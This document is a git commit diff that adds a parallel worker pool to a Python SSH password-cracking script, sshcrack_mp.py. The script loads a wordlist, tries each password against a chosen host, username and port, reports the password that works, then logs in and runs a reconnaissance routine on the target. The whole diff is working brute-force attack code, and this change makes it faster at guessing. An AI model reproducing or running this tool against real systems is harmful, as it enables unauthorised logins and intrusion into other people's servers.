a97a95376baf8ce0f48b43a0034b5c7b721bbf79
David Sanders <david.wm.sanders@gmail.com>
2017-12-06 11:34:58 +0000

    Add multiprocessing pool

--- sshcrack_mp.py
+++ sshcrack_mp.py
@@ -7,23 +7,22 @@ from pathlib import Path
 from pexpect import pxssh
 
 
-NUM_WORKERS_PER_CORE = 1
+NUM_WORKERS_PER_CPU = 1
 
 
-def connect(host, user, password, port):
+def connect(user, host, port, password):
     try:
         ssh = pxssh.pxssh()
         ssh.force_password = True
         ssh.login(host, user, password, port=port)
     except pxssh.ExceptionPxssh as e:
         if e.args[0] == "password refused":
-            print(f"({i}/{len(pws)}) Password is not '{pw}'")
-            return False
+            return False, password
         else:
             raise
     else:
         ssh.logout()
-        return True
+        return True, password
 
 
 def perform_recon(ssh):
@@ -43,37 +42,54 @@ def perform_recon(ssh):
 
 if __name__ == '__main__':
     try:
-        wrd_arg = sys.argv[1]
-        usr_arg = sys.argv[2]
-        hst_arg = sys.argv[3]
-        prt_arg = sys.argv[4]
+        word_arg = sys.argv[1]
+        user_arg = sys.argv[2]
+        host_arg = sys.argv[3]
+        port_arg = sys.argv[4]
     except IndexError:
         print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
         sys.exit(1)
 
-    wrd_pth = Path(__file__).parent / f"{wrd_arg}"
-    if not wrd_pth.exists():
-        print(f"Word list '{wrd_pth.name}' not found")
+    word_pth = Path(__file__).parent / f"{word_arg}"
+    if not word_pth.exists():
+        print(f"Word list '{word_pth.name}' not found")
         sys.exit(1)
 
     pws = []
-    with wrd_pth.open("r") as f:
+    with word_pth.open("r") as f:
         for pw in f.read().split("\n"):
             pws.append(pw)
 
-    print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")
+    print(f"Loaded {len(pws)} passwords from '{word_pth.name}'")
 
     clock_start = time.time()
-    for i, pw in enumerate(pws, 1):
-        if connect(hst_arg, usr_arg, pw, prt_arg):
-            clock_end = time.time()
-            print(f"({i}/{len(pws)}) Logged in! Password is '{pw}'")
-            td = clock_end - clock_start
-            print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {td/i:.2f}pw/s.")
-            ssh = pxssh.pxssh()
-            ssh.force_password = True
-            ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
-            perform_recon(ssh)
-            print("Logging out.")
-            ssh.logout()
+    pool = multiprocessing.Pool(multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU)
+
+    results = []
+    for pw in pws:
+        args = (user_arg, host_arg, port_arg, pw)
+        results.append(pool.apply_async(connect, args))
+
+    i = 0
+    for result in results:
+        res, pw = result.get()
+        i += 1
+        if res:
+            print(f"({i}/{len(pws)}) Password is '{pw}'")
+            pool.terminate()
             break
+        else:
+            print(f"({i}/{len(pws)}) Password is not '{pw}'")
+
+    clock_end = time.time()
+    pool.close()
+
+    td = clock_end - clock_start
+    print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {i/td:.2f}pw/s.")
+
+    ssh = pxssh.pxssh()
+    ssh.force_password = True
+    ssh.login(host_arg, user_arg, pw, port=port_arg)
+    perform_recon(ssh)
+    print("Logging out.")
+    ssh.logout()
